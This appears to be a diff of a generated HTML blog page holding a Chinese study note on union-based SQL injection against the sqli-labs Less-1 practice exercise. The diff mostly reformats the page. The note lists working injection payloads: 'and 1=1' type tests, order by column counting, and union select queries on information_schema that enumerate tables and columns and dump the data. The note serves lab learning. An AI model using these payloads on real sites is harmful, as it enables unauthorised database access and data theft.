@@ -394,36 +394,33 @@
 <p><img src="https://github.com/Lin060807/images/raw/main/db.png" alt="db"><br>db.php<br>创建了名为test的数据库<br>选择test数据库<br>创建名为users的表，包含了id，username，password（最大长度为50的字符串）<br>插入测试数据：<br>   1.用户名alice，密码12345<br>   2.用户名bob，密码abcde</p>
 <h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h2 id="Less-1（union注入）"><a href="#Less-1（union注入）" class="headerlink" title="Less-1（union注入）"></a>Less-1（union注入）</h2><p>题目：</p>
 <p><img src="https://github.com/Lin060807/images/raw/main/Less-1.png" alt="Less-1"></p>
-<pre><code> 1.查找注入点（?id=1）
- 2.判断是字符型还是数字型
+<p>1.查找注入点（?id&#x3D;1）<br>2.判断是字符型还是数字型</p>
+<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="operator">/</span><span class="number">2</span><span class="number">-1</span></span><br></pre></td></tr></table></figure>
  
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="operator">/</span><span class="number">2</span><span class="number">-1</span></span><br></pre></td></tr></table></figure>
+</code></pre>
+<p>3.如果是字符型，找他的闭合方式（‘“&#x2F;–+可以注释掉后面的部分）<br>4.判断查询列数</p>
+<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">group</span> <span class="keyword">by</span><span class="operator">/</span><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
  
- 3.如果是字符型，找他的闭合方式（‘“/--+可以注释掉后面的部分）
- 4.判断查询列数
- 
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">group</span> <span class="keyword">by</span><span class="operator">/</span><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
- 
- 5.查询回显位置(id改成不存在的数字)
- 
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">-1</span>‘ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+</code></pre>
+<p>5.查询回显位置(id改成不存在的数字)</p>
+<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id<span class="operator">=</span><span class="number">-1</span>‘ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
  
  imformation_schema（数据库）包含两个数据表tables（表名），columns（列名）
  
 
 数据库information_schema中的数据表tables下数据列table_name和数据表columns下数据列column_name
-
-6.查表名
-  
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat（table_name）,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+</code></pre>
+<p> 6.查表名</p>
+<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat（table_name）,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
  
-7.查列名
-  
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat（column_name）,<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-8.
-  
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(所显示的列名),<span class="number">3</span> <span class="keyword">from</span> 所需要的表名</span><br></pre></td></tr></table></figure>
+</code></pre>
+<p>7.查列名</p>
+<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat（column_name）,<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+</code></pre>
+<ol start="8">
+<li></li>
+</ol>
+<pre><code> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(所显示的列名),<span class="number">3</span> <span class="keyword">from</span> 所需要的表名</span><br></pre></td></tr></table></figure>
  
  
  
